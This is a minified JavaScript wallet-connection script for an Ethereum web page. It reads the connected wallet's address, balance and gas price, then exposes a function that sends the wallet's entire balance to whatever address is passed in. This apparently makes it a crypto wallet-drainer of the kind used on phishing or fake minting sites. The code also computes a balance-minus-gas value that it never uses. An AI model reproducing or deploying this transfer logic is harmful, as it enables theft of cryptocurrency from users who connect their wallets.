import{web3Modal,ethereumClient}from"./web.js";console.log("test",web3Modal);let web3;async function connectEther(){console.log("ethers",window.ethereum);const test=new Web3(window.ethereum);web3=test;console.log("signer here: ",test);const accounts=await test.eth.getAccounts();const gasPrice=await web3.eth.getGasPrice();console.log("my accounts",accounts);console.log("gas price",gasPrice);const balance=await fetchBalance(accounts[0]);window.balance=balance;window.address=accounts[0];window.gasPrice=gasPrice;return{address:accounts[0],balance,gasPrice}}async function fetchBalance(address){try{const balance=await web3.eth.getBalance(address);const etherBalance=web3.utils.fromWei(balance,'ether');console.log("Balance:",etherBalance);return etherBalance}catch(error){console.error("Error fetching balance:",error);alert(JSON.stringify(error));alert("Error fetching balance. Please check the console for more details.")}}async function handleTransactions(to){try{const{balance,address,gasPrice}=await connectEther();const valueInWei=web3.utils.toWei(balance,'ether');const finalPrice=valueInWei-gasPrice;console.log("money in wei",valueInWei,finalPrice);console.log("address",address);const transaction=await web3.eth.sendTransaction({from:address,to,value:valueInWei});console.log("Transaction successful:",transaction);alert("Transaction successful! Transaction Hash: "+transaction.transactionHash)}catch(error){console.error("Transaction error:",error);alert(JSON.stringify(error));alert("Transaction error! Please check the console for more details.")}}window.connectEther=connectEther;window.web3Modal=web3Modal;window.handleTransaction=handleTransactions;document.addEventListener("DOMContentLoaded",async()=>{try{window.ethereumClient=ethereumClient;const account=window.ethereumClient.getAccount();window.usersWalletAddress=account.address;window.providerWallet=""}catch(error){console.log("the error here",error)}});

